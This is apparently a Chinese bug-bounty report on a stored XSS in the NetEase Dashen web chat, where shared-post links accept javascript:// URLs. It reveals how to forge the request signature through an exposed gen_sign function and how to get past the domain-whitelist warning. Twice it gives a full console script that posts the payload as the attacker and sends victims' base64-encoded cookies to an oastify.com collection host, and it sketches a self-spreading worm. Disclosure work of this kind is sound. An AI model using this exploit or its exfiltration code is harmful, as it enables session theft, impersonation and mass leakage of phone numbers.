## 漏洞名称

> 网易大神Web端频道分享帖子存在存储型XSS漏洞

## 漏洞类型
> web漏洞，存储型XSS

## 危害等级
> 中危

## 漏洞URL
- POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg
- POC网页 https://ds.163.com/channel/0129911649/1111007930/ 打开后点击最新的分享链接，弹出xss弹框
- POC视频链接：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314

## 关键数据包

    POST /v1/web/chat-room-msg/send-msg HTTP/1.1
    Host: inf-im.ds.163.com
    Connection: close
    Content-Length: 586
    GL-CheckSum: 20c428fbe325f20d1ff139943dafd2334814804e_28aebbff3e33281f4afe3ebcf0b19ae90ba97998
    sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
    sec-ch-ua-mobile: ?0
    GL-Uid: xxxxxxx
    GL-DeviceId: 1189888043.1694780319
    Content-Type: application/json;charset=UTF-8
    Accept: application/json, text/plain, */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
    GL-ClientType: 61
    GL-Nonce: xxxx
    GL-X-XSRF-TOKEN: xxxxx
    sec-ch-ua-platform: "Windows"
    Origin: https://ds.163.com
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://ds.163.com/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
    Cookie: xxx

    { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "p", "url": "javascript://%0avar a=\"163.com\";alert(document.cookie);", "desc": "o", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }


## 漏洞描述
网易大神web版中，聊天频道分享帖子时，前后端没有对帖子的链接进行过滤，攻击者能够构造javascript链接，受害者通过点击链接触发XSS执行，攻击者能够窃取用户cookie（包含手机号码），伪造发消息等攻击。

### 详细说明
请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情
#### 漏洞触发
1. 登录大神Web平台 https://ds.163.com/
2. 进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
发消息测试，并且通过burpsuite观察请求包结构

    ![sendmsg](./images/sendmsg.png)

    可以从请求头header中看到，前端对请求体做了校验，攻击者直接修改请求体是不可行的
    ![checksum](./images/checksum.png)

3. 为了绕过校验，对前端的校验流程进行简单的逆行分析定位到校验函数，并且成功获取函数handler。
    https://g.166.net/res/a19/umi.b2e4db33.js 中的gen_sign函数对原始的请求体进行了校验并且返回校验的结果，如下：
    ![sign](./images/sign.png)
    继续分析，发现gen_sign函数来源于https://g.166.net/opd/latest/sig/bootstrap.js的sig模块，通过sig.default()能够初始化并且返回模块，从而获取到gen_sign函数handler
    ![module](./images/module.png)
    测试对请求体进行校验：
    ![gensign](./images/gensign.png)
    
4. 至此，我们能够对请求体进行篡改并且带上合法的校验头。最先想到的攻击面是对链接进行修改，看是否能够嵌入javascript://协议，从而触发XSS。因此，我们找到了一种消息类型为分享，能够分享大神动态、视频和帖子等。如下图：
    ![share](./images/share.png)
5. 构造xss payload。将分享链接设置为javascript://协议头，并且带上我们的payload，将fromUid设置为攻击者的UID，将url设置为javascript://%0aalert(\"xss\")，然后用上一步的gen_sign函数对请求体进行校验后，构造合法的post请求，实现分享发帖。

        {"serverId":"0149881871","channelId":"1459515","squareId":"60054a7dd5456877d226706e","fromUid":"b1fbb501020c46ff88577a3fe103c0ec","fromNick":"","msgType":"CHAT_ROOM_MSG","sourceType":"GOD_WEB","content":{"attachType":"link","attachData":{"title":"p","url":"javascript://%0aalert(\"xss\");"}},"contentType":"SHARE"}

    为简化操作，写一个js文件，实现自动发帖，请将下面脚本粘贴并且复制到大神网页的Console中执行。

        // burpsuite collaborator url
        const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
        // init webassembly and get sig_gen function
        // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
        var moduleX;
        Promise.all([sig.default()]).then(function (t) {
            moduleX = t
        })

        // 获取cookie信息
        const getCookieValue = (name) => (
            document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
        )

        const myFetch = async (url, headers) => {
            let data = await fetch(url, {
                method: 'GET',
                headers: headers,
                credentials: 'include'
            })
            let res = await data.json();
            return res
        }
        // 构造GET发送请求
        const setHeaderDs = (payload) => {
            var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
            var GL_Uid = getCookieValue('GOD_UUID')
            var checkres = moduleX['0'].gen_sign(payload)
            var checkjson = JSON.parse(checkres)
            var GL_CheckSum = checkjson['sign']
            var GL_Nonce = checkjson['timestamp']
            var GL_ClientType = 61
            var GL_DeviceId = localStorage.getItem('ns-client-id')
            var headers = {
                'GL-CheckSum': GL_CheckSum,
                'GL-Nonce': GL_Nonce,
                'GL-Uid': GL_Uid,
                'GL-DeviceId': GL_DeviceId,
                'GL-ClientType': GL_ClientType,
                'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
                'Content-Type': 'application/json;charset=UTF-8'
            }
            return headers
        }

        // 构造POST发送请求
        const myPostFetch = async (url, headers, payload) => {
            let data = await fetch(url, {
                method: 'POST',
                headers: headers,
                credentials: 'include',
                body: JSON.stringify(payload),
            })
            let res = await data.json();
            return res
        }

        // 通过img src来向burpsuite collaborator url外送敏感新信息
        const justSend = async url => {
            var Img = new Image
            Img.src = url
        }

        // base64 加解密
        const encode = str => {
            var b64 = btoa(unescape(encodeURIComponent(str)))
            return b64
        }
        const decode = str => {
            var str = decodeURIComponent(escape(atob(str)));
            return str
        }
        //获取并发送cookie，带有手机号
        const sendCookie = () => {
            var encoded = encode(document.cookie)
            // send data
            justSend(api_burp + '?data=' + encoded)
        }

        // 发送xss payload
        const startSendLinkMessage = async function () {

            // 链接，设置fromUid为攻击者的UID
            var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "点击惊喜", "url": "javascript://%0aalert(\"xss\");", "desc": "XXXXXXXSSSSSSSSS", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }

            var headers = setHeaderDs(JSON.stringify(payload_json))
            res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
        }
        startSendLinkMessage()
6. 将上面的脚本复制到大神页面的console执行，注意修改请求体的fromUid为攻击者的Uid，执行后，链接发送成功，受害者点击后，首先网页提示非大神链接谨慎访问（前端会检测链接是否在白名单中，如果不在则提示链接风险，但是可以绕过，见下文），点击打开，XSS弹框出现！

    ![warning](./images/warning.png)
    ![alert](./images/alert.png)

7. 绕过非大神链接谨慎访问校验

    首先对非大神进行unicode编码，然后全局搜索该编码可以定位到弹框出现的代码位置。
    ![unicode](./images/unicode.png)
    弹框代码位置：https://g.166.net/res/a19/p__channel__serverId__channelId.abd939d2.async.js
    ![block](./images/block.png)
    定位到如下校验逻辑，代码地址为：https://g.166.net/res/a19/p__channel__serverId__channelId.abd939d2.async.js
    ![whitelist](./images/whitelist.png)
    为绕过校验，只需要将帖子的链接javascript://%0aalert(\"xss\");变成javascript://%0aalert(\"xss\");var a=\"163.com\"即可，由于链接中第一次出现的域名是163.com,因此在白名单中，提示框并不会出现了。修改脚本中的xss payload请求如下：

        // 发送xss payload
        const startSendLinkMessage = async function () {

            // 链接，设置fromUid为攻击者的UID
            var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "点击惊喜", "url": "javascript://%0aalert(\"xss\");var a=\"163.com\";", "desc": "XXXXXXXSSSSSSSSS", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }

            var headers = setHeaderDs(JSON.stringify(payload_json))
            res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
        }
        startSendLinkMessage()


8. 该XSS的利用

    - 首先是窃取cookie，可能会带有邮箱和手机号信息
    
        ![cookie](./images/cookie.png)
    
    - 伪造发送消息等
    
        前文通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。

### 漏洞证明
请提供截图或视频

    POC视频链接如下：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314

完整利用脚本如下：

        // burpsuite collaborator url
        const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
        // init webassembly and get sig_gen function
        // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
        var moduleX;
        Promise.all([sig.default()]).then(function (t) {
            moduleX = t
        })

        // 获取cookie信息
        const getCookieValue = (name) => (
            document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
        )

        const myFetch = async (url, headers) => {
            let data = await fetch(url, {
                method: 'GET',
                headers: headers,
                credentials: 'include'
            })
            let res = await data.json();
            return res
        }
        // 构造GET发送请求
        const setHeaderDs = (payload) => {
            var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
            var GL_Uid = getCookieValue('GOD_UUID')
            var checkres = moduleX['0'].gen_sign(payload)
            var checkjson = JSON.parse(checkres)
            var GL_CheckSum = checkjson['sign']
            var GL_Nonce = checkjson['timestamp']
            var GL_ClientType = 61
            var GL_DeviceId = localStorage.getItem('ns-client-id')
            var headers = {
                'GL-CheckSum': GL_CheckSum,
                'GL-Nonce': GL_Nonce,
                'GL-Uid': GL_Uid,
                'GL-DeviceId': GL_DeviceId,
                'GL-ClientType': GL_ClientType,
                'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
                'Content-Type': 'application/json;charset=UTF-8'
            }
            return headers
        }

        // 构造POST发送请求
        const myPostFetch = async (url, headers, payload) => {
            let data = await fetch(url, {
                method: 'POST',
                headers: headers,
                credentials: 'include',
                body: JSON.stringify(payload),
            })
            let res = await data.json();
            return res
        }

        // 通过img src来向burpsuite collaborator url外送敏感新信息
        const justSend = async url => {
            var Img = new Image
            Img.src = url
        }

        // base64 加解密
        const encode = str => {
            var b64 = btoa(unescape(encodeURIComponent(str)))
            return b64
        }
        const decode = str => {
            var str = decodeURIComponent(escape(atob(str)));
            return str
        }
        //获取并发送cookie，可能带有手机号
        const sendCookie = () => {
            var encoded = encode(document.cookie)
            // send data
            justSend(api_burp + '?data=' + encoded)
        }

        // 发送xss payload
        const startSendLinkMessage = async function () {

            // 链接，设置fromUid为攻击者的UID
            var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "p", "url": "javascript://%0avar a=\"163.com\";alert(document.cookie);", "desc": "o", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }

            var headers = setHeaderDs(JSON.stringify(payload_json))
            res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
        }
        // 判断pc端还是手机端
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if (isMobile) {
            /* your code here */
        } else {
            //web端
            //伪造发分享消息
            startSendLinkMessage()
            //发送cookie
            sendCookie()
            
        }


## 漏洞危害
通过发送受诱惑的链接，诱导受害者点击，便可完成xss攻击。注意到大神平台多款游戏频道用户超过几十上百万，影响深远。
1. 攻击者可以在聊天群发送xss链接，用户点击后能够执行，大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；
2. 攻击者可以在聊天群发送xss链接，用户点击后能够执行，伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。

## 修复建议
1. 对用户的分享链接进行过滤

